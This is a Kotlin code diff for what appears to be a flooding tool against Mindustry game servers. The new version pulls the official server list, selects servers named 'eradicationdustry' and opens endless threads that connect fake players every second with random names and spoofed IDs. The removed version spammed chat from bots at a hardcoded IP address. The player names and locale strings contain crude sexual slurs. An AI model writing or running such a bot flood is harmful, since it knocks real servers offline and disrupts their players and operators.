@@ -2,26 +2,24 @@ package io.lucin
 
 import arc.math.Rand
 import arc.struct.Seq
+import arc.util.Http
+import arc.util.Log
 import arc.util.serialization.Base64Coder
+import arc.util.serialization.Jval
 import io.lucin.core.Entity
 import mindustry.Vars
 import mindustry.core.*
 import mindustry.gen.Groups
-import mindustry.gen.SendChatMessageCallPacket
 import mindustry.net.Packets.ConnectPacket
-import java.lang.Thread.sleep
+
+// Entity.EntityBuilder(false, packet(), "easyplay.su", 6567, 6567)
 
 fun main() {
     init()
-    while (true) {
-        val player = Entity.EntityBuilder(false, packet(), "109.94.209.233", 6570, 6570)
-        sleep(200)
-        val packet = SendChatMessageCallPacket()
-        packet.message = "приветик!!!!"
-        player.client.sendTCP(packet)
-        sleep(200)
-    }
-    while (true) {
+    val targets = listOfServes()
+    targets.forEach { target ->
+        val thread = Thread { task(target) }
+        thread.start()
     }
 }
 
@@ -43,17 +41,51 @@ private fun packet(): ConnectPacket {
     packet.version = -1
     packet.versionType = "official"
 
-    packet.name = "loli ${Rand().random(-99999, 99999).toString()} boobs"
-    packet.color = 0
-    packet.locale = "chlen mastera"
+    packet.name = Rand().random(-99999, 99999).toString()
+    packet.color = 255
+    packet.locale = "huy"
 
     packet.mods = Seq()
-    packet.mobile = true
+    packet.mobile = false
 
     packet.uuid = uuid()
     packet.usid = usid()
 
     return packet
+}
+
+private fun task(address: String) {
+    val fullAddress = address.split(':')
+    val ip = fullAddress[0]
+    val port = fullAddress[1].toInt()
+    while (true) {
+        Entity.EntityBuilder(false, packet(), ip, port, port)
+        Thread.sleep(1000)
+    }
+}
+
+private fun listOfServes(): List<String> {
+    var output = listOf<String>()
+    Http.get("https://raw.githubusercontent.com/Anuken/Mindustry/master/servers_v7.json")
+        .error(Log::err)
+        .block { res: Http.HttpResponse ->
+            if (res.status == Http.HttpStatus.OK) {
+                val json = Jval.read(res.resultAsString)
+                json.asArray().forEach { server ->
+                    if (server.getString("name").lowercase() == "eradicationdustry") {
+                        val addresses = server.get("address")
+                            .toString()
+                            .replace('[', ' ')
+                            .replace(']', ' ')
+                            .split(',')
+
+                        output = addresses
+                    }
+                }
+            }
+        }
+
+    return output
 }
 
 private fun uuid(): String {
